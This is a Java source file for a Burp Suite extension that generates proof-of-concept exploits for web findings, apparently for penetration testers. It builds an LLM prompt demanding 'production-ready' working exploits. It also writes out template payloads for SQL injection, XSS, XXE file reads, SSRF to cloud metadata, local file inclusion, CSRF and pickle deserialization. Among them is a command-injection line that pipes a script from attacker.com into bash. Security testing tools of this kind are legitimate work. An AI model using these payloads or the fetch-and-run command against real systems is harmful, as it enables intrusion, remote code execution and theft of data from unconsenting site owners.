package burp;

import java.util.*;
import org.json.*;
import java.io.PrintWriter;

/**
 * PoC Generator - Generates Proof of Concept exploit code for findings
 * Now with AI-powered generation for smarter, context-aware exploits
 *
 * @author Zahid Eroglu
 */
public class PoCGenerator {

    private static QwenAPIClient aiClient;
    private static PrintWriter stdout;
    private static PrintWriter stderr;

    /**
     * Initialize AI client for smart PoC generation
     */
    public static void initialize(QwenAPIClient client, PrintWriter out, PrintWriter err) {
        aiClient = client;
        stdout = out;
        stderr = err;
    }

    /**
     * Generate PoC code for a finding (with AI support if available)
     */
    public static String generatePoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        if (finding == null) {
            return "No finding provided";
        }

        // Try AI-powered generation first if available
        if (aiClient != null) {
            try {
                String aiPoC = generateAIPoweredPoC(finding, requestResponse, helpers);
                if (aiPoC != null && !aiPoC.isEmpty()) {
                    return "# 🤖 AI-Generated PoC\n\n" + aiPoC + "\n\n---\n\n" +
                           "# 📝 Template-Based PoC (Fallback)\n\n" +
                           generateTemplateBasedPoC(finding, requestResponse, helpers);
                }
            } catch (Exception e) {
                if (stderr != null) {
                    stderr.println("[!] AI PoC generation failed, using template: " + e.getMessage());
                }
            }
        }

        // Fallback to template-based generation
        return generateTemplateBasedPoC(finding, requestResponse, helpers);
    }

    /**
     * AI-powered PoC generation (ENHANCED VERSION)
     */
    private static String generateAIPoweredPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        if (aiClient == null) return null;

        try {
            // Build context for AI
            StringBuilder context = new StringBuilder();
            context.append("Vulnerability Type: ").append(finding.getType()).append("\n");
            context.append("Severity: ").append(finding.getSeverity()).append("\n");
            context.append("Confidence: ").append(finding.getConfidence()).append("\n");
            context.append("Description: ").append(finding.getDescription()).append("\n");
            context.append("Evidence: ").append(finding.getEvidence()).append("\n");

            String targetUrl = "";
            String httpMethod = "";
            String requestHeaders = "";
            String requestBody = "";

            if (requestResponse != null) {
                IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
                targetUrl = reqInfo.getUrl().toString();
                httpMethod = reqInfo.getMethod();

                context.append("\nTarget URL: ").append(targetUrl).append("\n");
                context.append("HTTP Method: ").append(httpMethod).append("\n");

                // Extract headers
                List<String> headers = reqInfo.getHeaders();
                if (headers.size() > 0) {
                    context.append("\nHeaders:\n");
                    for (String header : headers) {
                        if (!header.startsWith("GET") && !header.startsWith("POST") && !header.startsWith("PUT")) {
                            context.append("  ").append(header).append("\n");
                        }
                    }
                }

                // Extract request body
                int bodyOffset = reqInfo.getBodyOffset();
                byte[] request = requestResponse.getRequest();
                if (bodyOffset < request.length) {
                    requestBody = helpers.bytesToString(java.util.Arrays.copyOfRange(request, bodyOffset, request.length));
                    if (requestBody.length() > 500) {
                        requestBody = requestBody.substring(0, 500) + "...";
                    }
                    if (!requestBody.trim().isEmpty()) {
                        context.append("\nRequest Body:\n").append(requestBody).append("\n");
                    }
                }
            }

            // Enhanced AI prompt for comprehensive PoC generation
            String prompt = "You are an expert penetration tester. Generate a comprehensive, production-ready Proof of Concept (PoC) exploit for the following vulnerability.\n\n" +
                          "**IMPORTANT**: Generate ALL of the following formats:\n\n" +
                          "## 1. Executive Summary\n" +
                          "Brief explanation of the vulnerability and its impact.\n\n" +
                          "## 2. Python Exploit Script\n" +
                          "- Complete working script using requests library\n" +
                          "- Include error handling and output formatting\n" +
                          "- Add comments explaining each step\n" +
                          "- Support command-line arguments\n\n" +
                          "## 3. cURL Commands\n" +
                          "- Ready-to-use cURL commands\n" +
                          "- Include all necessary headers\n" +
                          "- Show both successful and failed attempts\n\n" +
                          "## 4. Burp Suite Repeater Request\n" +
                          "- Raw HTTP request that can be copied to Burp Repeater\n" +
                          "- Include exploit payload\n\n" +
                          "## 5. Exploitation Steps\n" +
                          "- Numbered step-by-step guide\n" +
                          "- Prerequisites\n" +
                          "- Expected output at each step\n\n" +
                          "## 6. Impact Analysis\n" +
                          "- Business impact\n" +
                          "- Technical impact\n" +
                          "- CVSS score if applicable\n\n" +
                          "## 7. Remediation\n" +
                          "- Immediate fixes\n" +
                          "- Long-term solutions\n" +
                          "- Code examples for fixes\n\n" +
                          "**Vulnerability Details:**\n" + context.toString() + "\n\n" +
                          "Generate practical, working exploit code. Use Markdown formatting with proper code blocks (```python, ```bash, ```http).";

            // Call AI with increased token limit for comprehensive output
            List<QwenAPIClient.Message> messages = new ArrayList<>();
            messages.add(new QwenAPIClient.Message("user", prompt));

            JSONObject response = aiClient.chatCompletion(messages, 0.3, 4000); // Increased token limit

            if (response != null && response.has("choices")) {
                JSONArray choices = response.getJSONArray("choices");
                if (choices.length() > 0) {
                    JSONObject choice = choices.getJSONObject(0);
                    if (choice.has("message")) {
                        JSONObject message = choice.getJSONObject("message");
                        String aiPoC = message.getString("content");

                        // Add Burp Repeater template if not already included
                        if (!aiPoC.toLowerCase().contains("burp") && requestResponse != null) {
                            aiPoC += "\n\n" + generateBurpRepeaterTemplate(finding, requestResponse, helpers);
                        }

                        return aiPoC;
                    }
                }
            }
        } catch (Exception e) {
            if (stderr != null) {
                stderr.println("[!] AI PoC generation error: " + e.getMessage());
            }
        }

        return null;
    }

    /**
     * Generate Burp Suite Repeater template
     */
    private static String generateBurpRepeaterTemplate(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder template = new StringBuilder();
        template.append("## 🔄 Burp Suite Repeater Template\n\n");
        template.append("Copy the following raw HTTP request to Burp Repeater:\n\n");
        template.append("```http\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            byte[] request = requestResponse.getRequest();
            String requestStr = helpers.bytesToString(request);

            // Inject exploit payload into the request
            String vulnType = finding.getType().toLowerCase();
            String payload = getExploitPayload(vulnType);

            // Simple payload injection (can be enhanced based on parameter detection)
            if (requestStr.contains("=")) {
                // Try to inject into first parameter
                requestStr = requestStr.replaceFirst("=([^&\\s]+)", "=" + payload);
            }

            template.append(requestStr);
        }

        template.append("\n```\n\n");
        template.append("**Note**: Modify the payload location based on the vulnerable parameter.\n");

        return template.toString();
    }

    /**
     * Get exploit payload based on vulnerability type
     */
    private static String getExploitPayload(String vulnType) {
        if (vulnType.contains("sql")) {
            return "' OR '1'='1";
        } else if (vulnType.contains("xss")) {
            return "<script>alert('XSS')</script>";
        } else if (vulnType.contains("xxe")) {
            return "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>";
        } else if (vulnType.contains("ssrf")) {
            return "http://169.254.169.254/latest/meta-data/";
        } else if (vulnType.contains("command")) {
            return "; whoami";
        } else if (vulnType.contains("lfi")) {
            return "../../../etc/passwd";
        } else {
            return "PAYLOAD_HERE";
        }
    }

    /**
     * Template-based PoC generation (fallback)
     */
    private static String generateTemplateBasedPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        String vulnType = finding.getType().toLowerCase();

        // Generate PoC based on vulnerability type
        if (vulnType.contains("sql") || vulnType.contains("injection")) {
            return generateSQLInjectionPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("xss") || vulnType.contains("cross-site scripting")) {
            return generateXSSPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("xxe")) {
            return generateXXEPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("ssrf")) {
            return generateSSRFPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("command") || vulnType.contains("rce")) {
            return generateCommandInjectionPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("idor") || vulnType.contains("broken access")) {
            return generateIDORPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("csrf")) {
            return generateCSRFPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("lfi") || vulnType.contains("file inclusion")) {
            return generateLFIPoC(finding, requestResponse, helpers);
        } else if (vulnType.contains("deserialization")) {
            return generateDeserializationPoC(finding, requestResponse, helpers);
        } else {
            return generateGenericPoC(finding, requestResponse, helpers);
        }
    }

    private static String generateSQLInjectionPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# SQL Injection PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();
            String method = reqInfo.getMethod();

            poc.append("## Python PoC (using requests)\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n");

            // SQL Injection payloads
            poc.append("payloads = [\n");
            poc.append("    \"' OR '1'='1\",\n");
            poc.append("    \"' UNION SELECT NULL--\",\n");
            poc.append("    \"' AND 1=2 UNION SELECT username,password FROM users--\",\n");
            poc.append("    \"'; WAITFOR DELAY '00:00:05'--\",\n");
            poc.append("]\n\n");

            poc.append("for payload in payloads:\n");
            if (method.equals("GET")) {
                poc.append("    params = {'param': payload}\n");
                poc.append("    response = requests.get(url, params=params)\n");
            } else {
                poc.append("    data = {'param': payload}\n");
                poc.append("    response = requests.post(url, data=data)\n");
            }
            poc.append("    print(f\"Payload: {payload}\")\n");
            poc.append("    print(f\"Status: {response.status_code}\")\n");
            poc.append("    print(f\"Response length: {len(response.text)}\\n\")\n");
            poc.append("```\n\n");

            poc.append("## cURL Command\n");
            poc.append("```bash\n");
            if (method.equals("GET")) {
                poc.append("curl -X GET \"").append(url).append("?param=' OR '1'='1\"\n");
            } else {
                poc.append("curl -X POST \"").append(url).append("\" \\\n");
                poc.append("  -d \"param=' OR '1'='1\"\n");
            }
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateXSSPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# Cross-Site Scripting (XSS) PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();

            poc.append("## XSS Payloads\n");
            poc.append("```html\n");
            poc.append("<script>alert('XSS')</script>\n");
            poc.append("<img src=x onerror=alert('XSS')>\n");
            poc.append("<svg onload=alert('XSS')>\n");
            poc.append("\"><script>alert(String.fromCharCode(88,83,83))</script>\n");
            poc.append("</script><script>alert('XSS')</script>\n");
            poc.append("```\n\n");

            poc.append("## Python PoC\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n");
            poc.append("payload = \"<script>alert('XSS')</script>\"\n");
            poc.append("params = {'search': payload}\n");
            poc.append("response = requests.get(url, params=params)\n\n");
            poc.append("if payload in response.text:\n");
            poc.append("    print(\"[!] XSS vulnerability confirmed!\")\n");
            poc.append("    print(f\"Payload reflected in response\")\n");
            poc.append("```\n\n");

            poc.append("## Browser Test URL\n");
            poc.append("```\n");
            poc.append(url).append("?param=<script>alert('XSS')</script>\n");
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateXXEPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# XXE (XML External Entity) PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        poc.append("## XXE Payload\n");
        poc.append("```xml\n");
        poc.append("<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n");
        poc.append("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n");
        poc.append("<root>\n");
        poc.append("  <data>&xxe;</data>\n");
        poc.append("</root>\n");
        poc.append("```\n\n");

        poc.append("## Out-of-Band XXE (for blind XXE)\n");
        poc.append("```xml\n");
        poc.append("<?xml version=\"1.0\"?>\n");
        poc.append("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://your-server.com/xxe\"> ]>\n");
        poc.append("<root>&xxe;</root>\n");
        poc.append("```\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();

            poc.append("## Python PoC\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n");
            poc.append("payload = '''<?xml version=\"1.0\"?>\n");
            poc.append("<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n");
            poc.append("<root>&xxe;</root>'''\n\n");
            poc.append("headers = {'Content-Type': 'application/xml'}\n");
            poc.append("response = requests.post(url, data=payload, headers=headers)\n");
            poc.append("print(response.text)\n");
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateSSRFPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# SSRF (Server-Side Request Forgery) PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();

            poc.append("## SSRF Payloads\n");
            poc.append("```\n");
            poc.append("http://localhost/admin\n");
            poc.append("http://127.0.0.1:8080/\n");
            poc.append("http://169.254.169.254/latest/meta-data/\n");
            poc.append("file:///etc/passwd\n");
            poc.append("```\n\n");

            poc.append("## Python PoC\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n");
            poc.append("ssrf_payloads = [\n");
            poc.append("    \"http://localhost/admin\",\n");
            poc.append("    \"http://127.0.0.1:8080/\",\n");
            poc.append("    \"http://169.254.169.254/latest/meta-data/\",\n");
            poc.append("]\n\n");
            poc.append("for payload in ssrf_payloads:\n");
            poc.append("    params = {'url': payload}\n");
            poc.append("    response = requests.get(url, params=params)\n");
            poc.append("    print(f\"Testing: {payload}\")\n");
            poc.append("    print(f\"Status: {response.status_code}\\n\")\n");
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateCommandInjectionPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# Command Injection PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        poc.append("## Command Injection Payloads\n");
        poc.append("```bash\n");
        poc.append("; ls -la\n");
        poc.append("| whoami\n");
        poc.append("& cat /etc/passwd\n");
        poc.append("`id`\n");
        poc.append("$(curl http://attacker.com/shell.sh | bash)\n");
        poc.append("```\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();

            poc.append("## Python PoC\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n");
            poc.append("payload = \"; whoami\"\n");
            poc.append("params = {'cmd': payload}\n");
            poc.append("response = requests.get(url, params=params)\n");
            poc.append("print(response.text)\n");
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateIDORPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# IDOR (Insecure Direct Object Reference) PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();

            poc.append("## Python PoC\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n\n");
            poc.append("# Try accessing other users' data\n");
            poc.append("for user_id in range(1, 100):\n");
            poc.append("    test_url = url.replace('user_id=X', f'user_id={user_id}')\n");
            poc.append("    response = requests.get(test_url)\n");
            poc.append("    if response.status_code == 200:\n");
            poc.append("        print(f\"[+] Accessible: User ID {user_id}\")\n");
            poc.append("```\n\n");

            poc.append("## Manual Test\n");
            poc.append("1. Identify the object reference parameter (id, user_id, etc.)\n");
            poc.append("2. Try changing the value to access other resources\n");
            poc.append("3. Check if authorization is properly enforced\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateCSRFPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# CSRF (Cross-Site Request Forgery) PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();
            String method = reqInfo.getMethod();

            poc.append("## HTML PoC\n");
            poc.append("```html\n");
            poc.append("<html>\n");
            poc.append("  <body>\n");
            poc.append("    <h1>CSRF PoC</h1>\n");
            poc.append("    <form action=\"").append(url).append("\" method=\"").append(method).append("\">\n");
            poc.append("      <input type=\"hidden\" name=\"action\" value=\"delete\" />\n");
            poc.append("      <input type=\"submit\" value=\"Click me!\" />\n");
            poc.append("    </form>\n");
            poc.append("    <script>document.forms[0].submit();</script>\n");
            poc.append("  </body>\n");
            poc.append("</html>\n");
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateLFIPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# LFI (Local File Inclusion) PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        poc.append("## LFI Payloads\n");
        poc.append("```\n");
        poc.append("../../../etc/passwd\n");
        poc.append("....//....//....//etc/passwd\n");
        poc.append("..%2f..%2f..%2fetc%2fpasswd\n");
        poc.append("php://filter/convert.base64-encode/resource=index.php\n");
        poc.append("```\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();

            poc.append("## Python PoC\n");
            poc.append("```python\n");
            poc.append("import requests\n\n");
            poc.append("url = \"").append(url).append("\"\n");
            poc.append("payloads = [\n");
            poc.append("    \"../../../etc/passwd\",\n");
            poc.append("    \"....//....//....//etc/passwd\",\n");
            poc.append("    \"php://filter/convert.base64-encode/resource=index.php\",\n");
            poc.append("]\n\n");
            poc.append("for payload in payloads:\n");
            poc.append("    params = {'file': payload}\n");
            poc.append("    response = requests.get(url, params=params)\n");
            poc.append("    print(f\"Payload: {payload}\")\n");
            poc.append("    if 'root:' in response.text:\n");
            poc.append("        print(\"[!] LFI confirmed!\")\n");
            poc.append("        print(response.text[:200])\n");
            poc.append("```\n");
        }

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateDeserializationPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# Insecure Deserialization PoC\n");
        poc.append("# Vulnerability: ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n\n");

        poc.append("## Java Deserialization\n");
        poc.append("Use ysoserial to generate payloads:\n");
        poc.append("```bash\n");
        poc.append("java -jar ysoserial.jar CommonsCollections1 'ping attacker.com' | base64\n");
        poc.append("```\n\n");

        poc.append("## Python Pickle Deserialization\n");
        poc.append("```python\n");
        poc.append("import pickle\n");
        poc.append("import base64\n");
        poc.append("import os\n\n");
        poc.append("class Exploit:\n");
        poc.append("    def __reduce__(self):\n");
        poc.append("        return (os.system, ('whoami',))\n\n");
        poc.append("payload = base64.b64encode(pickle.dumps(Exploit()))\n");
        poc.append("print(payload)\n");
        poc.append("```\n");

        poc.append("\n## Evidence\n");
        poc.append(finding.getEvidence()).append("\n");

        return poc.toString();
    }

    private static String generateGenericPoC(Finding finding, IHttpRequestResponse requestResponse, IExtensionHelpers helpers) {
        StringBuilder poc = new StringBuilder();
        poc.append("# PoC for ").append(finding.getType()).append("\n");
        poc.append("# Severity: ").append(finding.getSeverity()).append("\n");
        poc.append("# Confidence: ").append(finding.getConfidence()).append("\n\n");

        poc.append("## Description\n");
        poc.append(finding.getDescription()).append("\n\n");

        if (requestResponse != null) {
            IRequestInfo reqInfo = helpers.analyzeRequest(requestResponse);
            String url = reqInfo.getUrl().toString();
            String method = reqInfo.getMethod();

            poc.append("## Target Information\n");
            poc.append("- URL: ").append(url).append("\n");
            poc.append("- Method: ").append(method).append("\n\n");
        }

        poc.append("## Evidence\n");
        poc.append(finding.getEvidence()).append("\n\n");

        poc.append("## Exploitation\n");
        poc.append(finding.getExploitation()).append("\n\n");

        poc.append("## Remediation\n");
        poc.append(finding.getRemediation()).append("\n");

        return poc.toString();
    }
}
